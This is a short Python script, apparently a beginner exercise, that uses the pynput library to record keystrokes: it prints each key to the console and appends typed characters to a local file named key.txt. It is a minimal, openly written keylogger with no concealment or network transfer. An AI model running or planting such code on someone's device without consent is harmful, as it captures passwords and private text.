from pynput  import keyboard;

def keyPressed(key):
    print(key)
    with open("key.txt", 'a') as file: 
        try:
            char = key.char
            file.write(char)
        except:
            print('failed on', key)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()